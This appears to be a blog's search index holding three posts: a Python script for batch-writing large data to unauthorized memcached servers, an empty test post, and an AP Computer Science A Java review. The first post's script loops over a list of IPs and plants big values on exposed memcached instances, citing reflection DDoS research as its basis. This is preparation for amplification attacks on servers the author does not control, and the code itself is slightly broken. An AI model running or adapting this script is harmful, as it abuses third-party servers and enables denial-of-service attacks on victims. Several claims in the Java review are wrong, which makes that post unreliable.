<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Using Python to batch set data on unauthorized memcached servers</title>
      <link href="/2018/03/14/Using-Python-to-batch-set-data-on-unauthorized-memcached-servers/"/>
      <content type="html"><![CDATA[<h2 id="Requirement"><a href="#Requirement" class="headerlink" title="Requirement"></a>Requirement</h2><ol><li><p>Python 3.6</p></li><li><p>Memcache Package</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install python-memcached</span><br></pre></td></tr></table></figure></li></ol><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> memcache</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">()</span>:</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'ip.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():  <span class="comment">#get ip form txt file</span></span><br><span class="line">add = line.strip(<span class="string">'\n'</span>) <span class="comment">#avoiding the \n in the txt file</span></span><br><span class="line">ip = add+<span class="string">":11211"</span></span><br><span class="line">mc =  memcache.Client([ip],debug=<span class="keyword">True</span>)</span><br><span class="line">res = mc.set(<span class="string">'s'</span>,<span class="string">"VeryBigData\r\n"</span>*<span class="number">90000</span>)  <span class="comment">#set data</span></span><br><span class="line">res2 = mc.set(<span class="string">'s'</span>,<span class="string">"VeryBigData\r\n"</span>*<span class="number">10000</span>)</span><br><span class="line">res3 = mc.set(<span class="string">'s'</span>,<span class="string">"VeryBigData\r\n"</span>*<span class="number">50000</span>)</span><br><span class="line"><span class="keyword">if</span> res == <span class="keyword">True</span> <span class="keyword">or</span> res2 == <span class="keyword">True</span> <span class="keyword">or</span> res3 == <span class="keyword">True</span> <span class="keyword">or</span> res4 == <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'set_result.txt'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> c: <span class="comment">#Save the successful set result into txt</span></span><br><span class="line">c.write(ip + <span class="string">'\r\n'</span>) </span><br><span class="line">count += <span class="number">1</span></span><br><span class="line">print(<span class="string">"Success set:"</span>+str(count))</span><br><span class="line">set()</span><br></pre></td></tr></table></figure><p>This Python file can set data to the server but in a slow speed because I don’t know how to use the multi-threads :P</p><h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><p><a href="/images/shengbao.pdf">Deluge – How to generate 2TB per seconds reflection DDoS data flow via a family network</a></p><p><a href="http://www.giantbranch.cn/2018/01/21/%E7%AE%80%E5%8D%95%E5%AE%9E%E8%B7%B5%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%842T%E6%AF%8F%E7%A7%92%E7%9A%84DRDoS/" target="_blank" rel="noopener">Giantbranch’s blog</a></p>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Network Sec </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Test Post</title>
      <link href="/2018/03/14/Test-Post/"/>
      <content type="html"><![CDATA[<h3 id="Test-Post"><a href="#Test-Post" class="headerlink" title="Test Post"></a>Test Post</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">'''</span><br><span class="line">Code area</span><br><span class="line">'''</span><br></pre></td></tr></table></figure><center>Example</center><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Code area</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> Test </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Quick Review of AP CS A</title>
      <link href="/2018/03/14/Quick%20Review%20of%20AP%20CS/"/>
      <content type="html"><![CDATA[<h1 id="Types-and-Identifiers"><a href="#Types-and-Identifiers" class="headerlink" title="Types and Identifiers"></a>Types and Identifiers</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">(double) 3 / 4 &gt;&gt;&gt; 0</span></span><br><span class="line"><span class="string">3.0 / 4 &gt;&gt;&gt; 0.75</span></span><br><span class="line"><span class="string">(int)3.0 / 4 &gt;&gt;&gt; 0</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br></pre></td></tr></table></figure><h2 id="Logical-Operators"><a href="#Logical-Operators" class="headerlink" title="Logical Operators"></a>Logical Operators</h2><table><thead><tr><th style="text-align:center">Operator</th><th style="text-align:center">Meaning</th><th style="text-align:center">Example</th></tr></thead><tbody><tr><td style="text-align:center">!</td><td style="text-align:center">NOT</td><td style="text-align:center"><code>if(!found)</code></td></tr><tr><td style="text-align:center">&amp;&amp;</td><td style="text-align:center">AND</td><td style="text-align:center"><code>If(x &lt; 3 &amp;&amp; x&gt;4)</code></td></tr><tr><td style="text-align:center">\</td><td style="text-align:center">\</td><td style="text-align:center"></td><td>OR</td><td>`if(age &lt; 2</td><td></td><td>height &lt; 4)`</td></tr></tbody></table><ul><li>&amp;&amp; <ul><li>If both the same &gt;&gt;&gt; <code>True</code></li><li>If one is <code>True</code> another is <code>False</code> &gt;&gt;&gt;<code>False</code></li><li>If both<code>False</code> &gt;&gt;&gt; <code>False</code></li><li>If both<code>True</code> &gt;&gt;&gt; <code>True</code></li></ul></li><li>||<ul><li>If one is True &gt;&gt;&gt; <code>True</code> else &gt;&gt;&gt; <code>False</code></li></ul></li></ul><h2 id="Reminder-of-declarations"><a href="#Reminder-of-declarations" class="headerlink" title="Reminder of declarations"></a>Reminder of declarations</h2><ul><li><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> x  =<span class="number">42.1</span>;</span><br><span class="line"><span class="keyword">int</span> y = x;</span><br><span class="line"><span class="comment">//return Error</span></span><br><span class="line"><span class="comment">//int couldn not be given with double</span></span><br></pre></td></tr></table></figure></li><li><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x  =<span class="number">42</span>;</span><br><span class="line"><span class="keyword">double</span> y = x;</span><br><span class="line"><span class="comment">//No Error</span></span><br><span class="line"><span class="comment">//int can be convert to double</span></span><br></pre></td></tr></table></figure></li><li><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> x = <span class="number">14.7</span>;</span><br><span class="line"><span class="keyword">int</span> y = (<span class="keyword">int</span>) x;</span><br><span class="line"><span class="comment">//No Error</span></span><br><span class="line"><span class="comment">//double can be convert to int</span></span><br></pre></td></tr></table></figure></li><li><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> / <span class="keyword">int</span> &gt;&gt;&gt; <span class="keyword">int</span></span><br><span class="line"><span class="comment">//So double x = int / int doesn't work</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="Method-Overloading"><a href="#Method-Overloading" class="headerlink" title="Method Overloading"></a>Method Overloading</h1><ul><li><p>Overloaded methods are two or more methods in the same class that have the same name but different parameter lists. </p></li><li><p>Example:</p><ul><li><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DoOperations</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">product</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123; <span class="keyword">return</span> n * n; &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">product</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123; <span class="keyword">return</span> x * x; &#125; <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">product</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> x * y; &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ul></li><li><p>*You can’t have two methods with identical signatures but different return types.</p></li><li><p>Every overloaded method should have different parameter eg. </p></li><li><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">product</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123; </span><br><span class="line"><span class="keyword">return</span> n * n; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">product</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> x * x; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">product</span><span class="params">(<span class="keyword">double</span> n)</span> </span>&#123; </span><br><span class="line"><span class="keyword">return</span> n ; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Will throw a Error because having two methods with identical signatures</span></span><br></pre></td></tr></table></figure></li><li><p><del>即不能重名</del></p></li></ul><h1 id="The-this-Keyword"><a href="#The-this-Keyword" class="headerlink" title="The this Keyword"></a>The this Keyword</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> num; <span class="comment">//numerator private int denom; //denominator</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Now consider a constructor for the Rational class:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Rational</span><span class="params">(<span class="keyword">int</span> num, <span class="keyword">int</span> denom)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.num = num;</span><br><span class="line"><span class="keyword">this</span>.denom = denom; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>It is definitely not a good idea to use the same name for the explicit parameters and the private instance variables. But if you do, you can avoid errors by referring to this.num and this.denom for the current object that is being constructed. (This particular use of this will not be tested on the exam.) </li></ul><h1 id="Array-and-Array-List"><a href="#Array-and-Array-List" class="headerlink" title="Array and Array List"></a>Array and Array List</h1><h2 id="Initialization"><a href="#Initialization" class="headerlink" title="Initialization"></a>Initialization</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Array</span></span><br><span class="line"><span class="keyword">double</span>[] data = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">25</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> data[] = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">25</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span>[] data;</span><br><span class="line">data = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">25</span>];</span><br></pre></td></tr></table></figure><ul><li>Using <code>array.length</code>to get the length of an array(length without<code>()</code>)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ArrayList</span></span><br><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br></pre></td></tr></table></figure><ul><li>Using <code>al.size()</code>to get the length of an arrayList</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2D Array</span></span><br><span class="line"><span class="keyword">double</span>[][] matrix = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">3</span>][<span class="number">4</span>];</span><br><span class="line">or</span><br><span class="line">String[][] strs = <span class="keyword">new</span> String[<span class="number">2</span>][<span class="number">5</span>];</span><br><span class="line">or</span><br><span class="line"><span class="keyword">int</span>[][] mat = &#123; &#123;<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;, <span class="comment">//row 0</span></span><br><span class="line">  &#123; &#123;<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125; &#125;; <span class="comment">//row 1</span></span><br></pre></td></tr></table></figure><ul><li>Using <code>arraylist[0].length</code>to get the number of columns of the arraylist</li><li>Using <code>arraylist.length</code>to get the number of row in the arraylist</li><li>Using twice For-Loop to get all subject in an arraylist</li></ul><h3 id="Operator-for-ArrayList"><a href="#Operator-for-ArrayList" class="headerlink" title="Operator for ArrayList"></a>Operator for ArrayList</h3><ul><li><code>add()</code>or<code>add(i,subject)</code>it will insert the subject before the subject which in the original place and change the sequence of the List</li><li><code>remove()</code> *It will return a String Which was removed form the arraylist</li></ul>]]></content>
      
      
        <tags>
            
            <tag> Programming </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
